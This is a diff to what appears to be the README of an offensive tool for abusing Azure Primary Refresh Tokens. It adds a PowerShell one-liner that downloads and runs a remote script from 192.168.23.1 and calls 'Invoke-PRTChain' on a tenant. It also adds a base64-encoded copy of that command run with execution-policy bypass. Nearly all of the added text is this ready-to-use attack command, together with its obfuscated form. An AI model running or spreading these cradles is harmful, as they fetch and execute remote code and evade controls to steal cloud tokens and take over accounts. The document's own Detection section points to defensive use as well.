@@ -218,6 +218,17 @@ Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages?`$top=5" -H
 | `azurerm` | `https://management.azure.com/` |
 | `keyvault` | `https://vault.azure.net/` |
 
+### Powershell One liner 
+
+```powershell
+# one shot
+IEX (iwr http://192.168.23.1/PowerPrt.ps1 -UseBasicParsing); Invoke-PRTChain -TenantId "5f63d0b6-a17c-447b-bdfe-db9e2475497b"
+# Or Base64 it
+powershell -ep bypass -e SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgAzAC4AMQAvAFAAbwB3AGUAcgBQAHIAdAAuAHAAcwAxACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApADsAIABJAG4AdgBvAGsAZQAtAFAAUgBUAEMAaABhAGkAbgAgAC0AVABlAG4AYQBuAHQASQBkACAAIgA1AGYANgAzAGQAMABiADYALQBhADEANwBjAC0ANAA0ADcAYgAtAGIAZABmAGUALQBkAGIAOQBlADIANAA3ADUANAA5ADcAYgAiAA==
+```
+
+<img width="1918" height="993" alt="image" src="https://github.com/user-attachments/assets/98f471c2-39ba-43fd-ac6a-b193d68a8dd0" />
+
 ---
 
 ## Detection
